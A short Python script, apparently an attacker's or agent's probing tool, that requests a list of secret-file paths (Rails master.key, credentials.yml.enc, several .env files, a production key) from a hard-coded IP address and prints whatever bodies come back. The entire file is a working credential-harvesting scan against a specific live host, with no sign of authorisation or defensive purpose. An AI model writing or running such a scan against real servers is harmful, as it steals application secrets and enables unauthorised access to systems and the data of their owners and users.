#!/usr/bin/env python3
"""Try to find Rails master key via web paths"""
import urllib.request
import urllib.error

HOST = "http://38.107.234.149:3000"

paths = [
    "/config/master.key",
    "/master.key",
    "/app/config/master.key",
    "/rails/config/master.key",
    "/.env",
    "/app/.env",
    "/config/credentials.yml.enc",
    "/credentials.yml.enc",
    "/env",
    "/config/env",
    "/app/config/env",
    "/.env.production",
    "/app/config/credentials/production.key",
]

for path in paths:
    url = HOST + path
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=3) as resp:
            code = resp.getcode()
            body = resp.read().decode(errors="replace")[:200]
            print("{} -> HTTP {} : {}".format(path, code, body.strip()[:80]))
    except urllib.error.HTTPError as e:
        if e.code != 404:
            print("{} -> HTTP {}".format(path, e.code))
    except Exception:
        pass

print("Done")
